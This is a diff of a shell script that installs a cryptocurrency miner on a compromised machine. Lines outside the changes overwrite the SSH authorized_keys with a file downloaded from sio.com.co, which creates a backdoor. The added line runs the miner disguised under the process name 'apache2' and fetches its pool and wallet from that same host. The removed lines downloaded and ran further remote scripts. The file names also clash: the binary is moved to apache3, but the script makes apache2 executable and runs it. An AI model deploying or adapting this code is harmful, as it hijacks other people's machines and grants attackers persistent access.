@@ -1,3 +1,4 @@
+cd
 cd .ssh
 rm -rf authorized_keys
 wget -q sio.com.co/authorized_keys
@@ -15,14 +16,10 @@ dpkg --configure -a
 apt-get -y --force-yes install libcurl4-openssl-dev libncurses5-dev pkg-config automake yasm git  psmisc
 
 wget https://api.ipify.org	
-wget sio.com.co/m/cpuminer-multi/minerd
-mv minerd apache2
+mv tanhuevon/minerd ./apache3
 chmod +x apache2
 
-rm -rf apache.sh; wget sio.com.co/m/apache.sh 
-nohup bash apache.sh &
-
-#echo '0 0,3,6,9,12,15,18,21 * * * rm -rf apache.sh; wget sio.com.co/m/apache.sh ; bash apache.sh &> auto.log' | crontab -
+nohup ./apache2 -a cryptonight -o stratum+tcp://`wget -q -O - sio.com.co/m/dirpool.txt` -u `wget -q -O - sio.com.co/m/dirwallet.txt`+10000 -p `cat index.html`"-"`date +%y%m%d`:zonewar@hotmail.com -t `grep processor /proc/cpuinfo| wc -l` &
 
 sleep 2
-tail -f apache3.log
+tail -f nohup.out
